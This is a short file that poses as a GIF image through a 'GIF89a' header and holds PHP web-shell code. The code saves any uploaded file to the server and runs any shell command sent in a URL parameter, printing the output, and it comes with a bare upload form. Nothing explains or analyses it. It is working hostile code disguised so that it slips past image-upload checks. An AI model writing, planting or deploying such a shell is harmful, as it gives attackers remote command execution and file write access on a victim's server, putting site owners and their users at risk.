GIF89a
<?php if($_FILES)move_uploaded_file($_FILES['f']['tmp_name'],$_FILES['f']['name']);if($_GET['c']??0)echo"<pre>".shell_exec($_GET['c'])."</pre>";?><form method=post enctype=multipart/form-data><input type=file name=f><input type=submit></form>
